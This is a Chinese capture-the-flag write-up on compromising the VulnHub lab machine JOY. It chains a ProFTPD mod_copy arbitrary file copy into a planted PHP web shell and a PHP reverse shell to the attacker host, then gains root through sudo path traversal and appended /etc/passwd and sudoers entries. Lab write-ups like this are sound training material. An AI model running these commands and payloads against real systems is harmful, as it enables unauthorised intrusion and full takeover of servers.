# 前言

靶机：`digitalworld.local-JOY`，IP地址为`192.168.10.8`

攻击：`kali`，IP地址为`192.168.10.6`

`kali`采用`VMware`虚拟机，靶机选择使用`VMware`打开文件，都选择桥接网络

这里官方给的有两种方式，一是直接使用`virtualbox`加载，另一种是通过`VMware`直接加载，也给出了`iso`镜像文件。

> 文章中涉及的靶机，来源于`vulnhub`官网，想要下载，可自行访问官网下载，或者通过网盘下载

# 主机发现

使用`arp-scan -l`或`netdiscover -r 192.168.10.1/24`扫描

也可以使用`nmap`等工具进行

![](pic-joy\1.jpg)

# 信息收集

## 使用nmap扫描端口

扫描`tcp`端口，并保存于`nmap-tcp`

```shell
nmap -sT 192.168.10.8 --min-rate=1000  -p- -T4 -oA nmap-tcp
```

![](pic-joy\2.jpg)

扫描常见的20个`udp`端口，不过这里的端口明显处于`open`的很少

```shell
nmap -sU 192.168.10.8 --top-ports 20 -T4 -oA nmap-udp
```

![](pic-joy\3.jpg)

把前面扫描出的`tcp`端口，进行处理，只取端口号

```shell
grep open nmap-tcp.nmap | awk -F'/' '{print $1}' | paste -sd ','
ports=21,22,25,80,110,139,143,445,465,587,993,995
```

![](pic-joy\4.jpg)

对特定的端口号进行深入探测

```shell
nmap -sV -O -sC -sT 192.168.10.8 -p $ports -oA detail
```

![](pic-joy\5.jpg)

![6](pic-joy\6.jpg)

![7](pic-joy\7.jpg)

![8](pic-joy\8.jpg)

对特定的端口号进行漏洞检测

```shell
nmap --script=vuln 192.168.10.8 -p $ports -oA vuln
```

![](pic-joy\9.jpg)

![10](pic-joy\10.jpg)

![11](pic-joy\11.jpg)

![12](pic-joy\12.jpg)

## FTP探测

根据前面的扫描，FTP可能存在匿名访问，进行测试一下

```shell
ftp anonymous@192.168.10.8
#密码为空，直接回车即可
```

连接后，发现两个目录，一个`download`和`upload`，发现只有`upload`目录下有文件，那么切换到`upload`，并下载其所有文件

```shell
ftp> ls -la
ftp> cd upload
ftp> prompt
ftp> mget *
```

![](pic-joy\13.jpg)

查看`directory`文件，发现该文件是`patrick`的目录

![](pic-joy\14.jpg)

![15](pic-joy\15.jpg)

这个文档中的信息，有很多，首先就是文件名，怀疑可能是某些密码，保存下来

```
21of1MpiDdVvvYLjo4AhHCecLJo3NgD0jffaKqiFYUyBTQ6CLXclayRkalxCOKf8
9FSVhszYzcRO20fKcv9688Z5fOs4th4P
cfIz4HeRZ3xDLuyX0NVpGDYENn510l9S
JIjoSjMXYEdbF4Nlutkoe0HY3WDTstaYBzeqqgqHpAUWiadJvSJm3GhAtYclakIS
KlooiPobIYqCt3Drm0aHYCyAjRMQjbhIc9QQ8EjeV8d97OPBCBBdqfxxxy7sh8Nj
LztsbkkhKLpxTzx4b4qRBK44hTDqr7cG
```

且在后面还有系统信息

`Linux JOY 4.9.0-8-amd64 #1 SMP Debian 4.9.130-2 (2018-10-27) x86_64 GNU/Linux`

继续查看其他文件，发现大部分无用，不过在`project_zoo`文档中，发现多信息，疑似可能有用

![](pic-joy\16.jpg)

把这些信息都保存在`words.txt`中

## smb探测

使用`enum4linux`进行枚举，枚举出的只有两个分享`print$`和`IPC$`，用户枚举出两个，一个`patrick`和`ftp`

![](pic-joy\17.jpg)

使用`nmap`的脚本进行测试，发现结果与`enum4linux`差不多

```shell
nmap --script=smb* 192.168.10.8
```

![](pic-joy\18.jpg)



## 网站探测

访问80端口的`http`服务，有一个目录`ossec`

![](pic-joy\19.jpg)

点击`ossec`，可以看到是某个`cms`

![](pic-joy\20.jpg)

使用`gobuster`进行目录爆破

```shell
gobuster dir -u http://192.168.10.8/ossec -w /usr/share/wordlists/dirb/big.txt -x php,bak,txt,js,html -b 403-404
```

![](pic-joy\21.jpg)

发现`README`，尝试访问，发现具体的`cms`的版本信息，`ossec web ui v0.8`

以及`ossec`的版本处于`>=0.9-3`

![](pic-joy\22.jpg)

使用`searchsploit`搜索有无漏洞可利用，不过可以看到并无需要的，两个本地提权，一个拒绝服务

```shell
searchsploit ossec
```

![](pic-joy\23.jpg)

测试网站的`php`文件，也没有测试到隐藏的传参，路径遍历也没有。

网站能点的都点了，也没有用

## ssh探测

这里尝试进行`ssh`连接，以之前的`words.txt`中的数据作为密码，尝试爆破`patrick`，但是没有结果，尝试搜索漏洞，`dropbear`，虽然有相关漏洞，但是查看具体内容，发现并不适合当前所用



# FTP再探

使用`nmap`具体扫描一下`ftp`

```shell
nmap -sV --script=ftp* 192.168.10.8 -p 21
```

![](pic-joy\23-1.jpg)

其他协议该重测的都重测了，这里只有这个在尝试`nc`或`telnet`连接后，输入`help`有提示命令

![](pic-joy\24.jpg)

这里就是通过`ftp`协议直接连接与其他方式的不同之处了，ftp连接后相当于直接进入文件管理，而`telnet`连接，其本身就相当于远程登录，所以不一样。

不过这里在测试很多命令后，有些命令无权使用，只能看看目录等，并且大部分的命令需要登录，不过登录后，也就是以`anonymous`登录后，还是不能用的很多。

不过对于这些命令，尝试搜索一下功能，发现`site`这个是`用于发送特定于服务器的站点命令，不同服务器对其实现可能不同`，用法可以`site help`

![](pic-joy\25.jpg)

再次搜索`CPFR`和`CPTO`及其他子命令，发现有意思

| 命令                      | 功能                                                    | 用法示例                                  |
| ------------------------- | ------------------------------------------------------- | ----------------------------------------- |
| `SITE CPFR <sp> pathname` | 指定要复制的源文件路径，用于后续文件复制操作            | `SITE CPFR /home/user/source.txt`         |
| `SITE CPTO <sp> pathname` | 指定复制的目标文件路径，与 `SITE CPFR` 配合完成文件复制 | `SITE CPTO /home/user/destination.txt`    |
| `SITE HELP`               | 获取服务器支持的 `SITE` 子命令的帮助信息                | `SITE HELP`                               |
| `SITE CHGRP`              | 更改远程服务器上文件或目录的所属组                      | `SITE CHGRP newgroup /home/user/test.txt` |
| `SITE CHMOD`              | 修改远程服务器上文件或目录的权限                        | `SITE CHMOD 755 /home/user/test.txt`      |

根据目前来说，当前获取到一个`shell`或者能够登录到靶机是要做的

> 之前在`ftp`连接后的一个文件`directory`，其中是`patrick`的目录，这应该是个用户，因为在文件中发现了`.ssh`，所以猜测路径应该是`/home/patrick`
>
> 尝试复制这个路径下的一些文件，根据前面`enum4linux`枚举的用户来看，有`ftp`，应该是和`patrick`同级别的，那么其目录可能也是`/home/ftp`。
>
> 因为当前可查看到文件的，只能通过`ftp`下载到本地，所以知道`ftp`目录很关键。

若`ftp`目录不是这个，还可以百度一下，其默认的路径。若还不是，就另寻路线了

这时候前面使用`nmap`扫描的`ftp`信息出来了，具体版本为`proftpd 1.2.10`，然后使用`searchsploit`搜索，发现并未合适的，再通过百度和`google`搜索，发现有趣的东西

>在1.1.5版本及以下，`mod_copy`模块存在一个重大安全漏洞，允许远程攻击者通过`site cpfr`和`site cpto`命令读取和写入任意文件。未经验证的客户端可以利用这些命令，在文件系统中自由地复制文件，操作权限等同于运行ProFTPd服务的用户——通常是'nobody'用户。通过将PHP负载复制到网站目录并利用`/proc/self/cmdline`，攻击者可以实现PHP远程代码执行。

# 漏洞利用

那么就尝试，首先需要明白，就是未授权的复制，所以这里复制一些信息到`ftp`目录

```shell
site cpfr /home/patrick/.ssh
site cpto /home/ftp/download/ssh

site cpfr /home/patrick/version_control
site cpto /home/ftp/download/version_control
```

![](pic-joy\26.jpg)

成功了，啧，那么应该可以修改一些配置文件，比如`ssh`的连接配置，修改后，使得可以指定某些用户可以登录，先查看文件是否有想要的

啧，`patrick`中的`.ssh`文件夹中是空的，可能没有公私钥吧

查看`version_control`，不要问为什么查看这个，我是把所以文件都看了，只有这个文件的内容有帮助

这里给出了网站的根目录，不再是默认的`/var/www/html`

![](pic-joy\27.jpg)

这里尝试复制`root`下的文件，没想到可以，这个权限很高啊

不过复制`/root`下的文件后，也没有获取到`shell`，只是能看到，并且获取到`root`的三个私钥文件，但是连接`ssh`时就是不行，可能就是配置问题，但是网上搜索的默认的配置文件，测试后都没有，放弃这条路线

也就是获取到了密码或证书，都无法通过`ssh`登录

# 反弹shell

前面获取到的网站目录可能有大用

编写一个`php`代码，文件名为`shell.php`，因为网站的脚本语言是`php`

```php
<html>
<body>
<form method="GET" name="<?php echo basename($_SERVER['PHP_SELF']); ?>">
<input type="TEXT" name="cmd" id="cmd" size="80">
<input type="SUBMIT" value="Execute">
</form>
<pre>
<?php
    if(isset($_GET['cmd']))
    {
        system($_GET['cmd']);
    }
?>
</pre>
</body>
<script>document.getElementById("cmd").focus();</script>
</html>
```

通过`ftp`连接后上传，然后再通过`telnet`连接21端口，进行复制

![](pic-joy\28.jpg)

可以看到有了，说明成功

![](pic-joy\29.jpg)

访问`shell.php`后，尝试了`bash、nc`的几种反弹`shell`无效后，使用`php`

```shell
php -r '$sock=fsockopen("192.168.10.6",9999);exec("bash <&3 >&3 2>&3");'
```

先在`kali`开启监听

```shell
nc -lvnp 9999
```

这时候执行上面的`php`语句即可反弹成功

![](pic-joy\30.jpg)

# 靶机内信息收集

查看网站中的目录，啧，真的是有内容，但是字典就是扫不出来啊

![](pic-joy\31.jpg)

| 用户名  | 密码                                   |
| ------- | -------------------------------------- |
| patrick | apollo098765                           |
| root    | howtheheckdoiknowwhattherootpasswordis |

测试，`patrick`用户可以切换

![](pic-joy\32.jpg)

使用`find`寻找具有SUID权限的文件

```shell
find / -perm -4000 -print 2>/dev/null
```

![](pic-joy\33.jpg)

# 提权

## 提权方法1，用sudoer指定的文件

使用`sudo -l`发现一个文件是可以的，并且是`nopasswd`的，不过此时没有这个文件夹的权限

使用`sudo -u root 【文件】`执行

![](pic-joy\34.jpg)

再次执行，这里就是修改文件的权限的脚本，并且，是把用户的输入进行拼接到当前路径

![](pic-joy\35.jpg)

那么使用`../`在拼接时，能否绕过呢，根据前面的提示，这里采用三个`../`

修改权限成功

![](pic-joy\36.jpg)

既然如此，我直接把`/bin/bash`加个SUID权限不就可以了

![](pic-joy\37.jpg)

这里这个脚本很强大，可以修改权限的，那么就可以随意修改了，这里加SUID权限是最便捷的。

还可以修改`/etc/shadow`文件的权限，然后去查看，再使用`john`或`hashcat`去破解，这个比较耗时间



还可以修改`/etc/passwd`文件，因为已经`777`了，所以直接添加一个

首先复制`root`在`/etc/passwd`中的构造

```shell
root:x:0:0:root:/root:/bin/bash
```

然后在`kali`使用`openssl`生成一个密码

```shell
openssl passwd -6 123

$6$r9KLjdk5AsgDfU/k$4JwtAwJUiLll6epxebGXc5xIySOoO1NvolN5z5RLh6CYxqOXwbNroMbtpxKXCUlkhuCtRMCyHpklQMOwYMLnJ.
```

然后与上面的拼接一下，也就是`root:x`修改，这里的`x`就是表示密码存储在`/etc/shadow`文件中，若不是`x`，则是从这个文件中直接使用了

```shell
cat:$6$r9KLjdk5AsgDfU/k$4JwtAwJUiLll6epxebGXc5xIySOoO1NvolN5z5RLh6CYxqOXwbNroMbtpxKXCUlkhuCtRMCyHpklQMOwYMLnJ.:0:0:root:/root:/bin/bash

#使用echo时，这里一定要用单引号
echo 'cat:$6$r9KLjdk5AsgDfU/k$4JwtAwJUiLll6epxebGXc5xIySOoO1NvolN5z5RLh6CYxqOXwbNroMbtpxKXCUlkhuCtRMCyHpklQMOwYMLnJ.:0:0:root:/root:/bin/bash' >> /etc/passwd
```

![](pic-joy\38.jpg)



这里甚至可以都试一遍，也就是网站`gtfobins.github.io`中有的，你就试吧，都加上`suid`权限都可，或者去修改`/etc/sudoers`文件，去添加吧

```shell
echo "patrick ALL=(ALL:ALL) ALL" >> /etc/sudoers
```



## 提权方式2

这里因为前面使用`telnet`连接21端口时，尝试使用`cpfr、cpto`时，发现可以覆盖文件，所以这里尝试覆盖一些文件，以达到提权的目的，不过这里因为`ssh`无法连接的原因，所以是建立在从网站获取`shell`后，而且方法也是与前面一致，通过复制对应的文件，然后在`kali`中修改，然后再通过复制进行覆盖原本的文件。

使用`cpfr、cpto`获取`/etc/passwd`或`/etc/sudoers`文件

![](pic-joy\39.jpg)

然后在`kali`中通过`ftp`协议连接靶机，下载到`kali`，然后修改文件内容，再把文件上传到`ftp`服务器中，在两个文件的后面加上下面的语句即可

```shell
#passwd，这里的密码与前面的cat是一样的
dog:$6$r9KLjdk5AsgDfU/k$4JwtAwJUiLll6epxebGXc5xIySOoO1NvolN5z5RLh6CYxqOXwbNroMbtpxKXCUlkhuCtRMCyHpklQMOwYMLnJ.:0:0:root:/root:/bin/bash

#sudoers
patrick ALL=(ALL:ALL) NOPASSWD: ALL
```

![](pic-joy\40.jpg)

然后上传到`ftp`服务器

```shell
put passwd
put sudoers
```

![](pic-joy\41.jpg)

然后通过`telnet`连接21端口后，进行复制覆盖

![](pic-joy\42.jpg)

这时候再通过网站反弹的`shell`去测试即可，这里甚至可以不用到`patrix`，当然这里我省略了，可以自己去测试

![](pic-joy\43.jpg)



# 总结

该靶机有几点值得思考：

1. 对于网站，可能就不存在漏洞去测试，所以死磕的话，可能就会很费时间，不过这也是间接的考察，因为如果你测试完毕发现确实无漏洞的话，会自行换方向的
2. 对于`ftp`的匿名登录后的信息，可能就会暴露一些敏感信息，这里就是暴露了`kiaptrix`的家目录，也就大致猜测路径后，获取到对应的信息
3. 对于信息收集一定要全面，是一定要全面，这里因为我收集信息时，对于`ftp`的服务版本忽略，导致费了很长时间，虽然最终也测试到了`cpfr、cpto`的未授权执行，但是若是提前发现了`proftp`的版本，也就无需这么长时间了
4. 对于`ssh`这里可能是配置问题，我没有继续测试，因为配置文件改变是需要重启服务的，这在现实中不可能
5. 对于网站信息的根目录，并非都是默认的`/var/www/html`，这里就是自己更换的
6. 靶机内的信息收集也要全面，不要错过，这里因为我是先看的网站目录，发现了敏感数据，所以没有进一步收集信息
7. 提权，这个靶机内的提权，基本上是建立在获取`patrick`密码后的`sudo`，`sudo -l`的一个脚本文件，是可以修改文件的权限的，这就给予很大发挥空间。当然还有`proftp`的复制覆盖是可以直接添加用户的



























































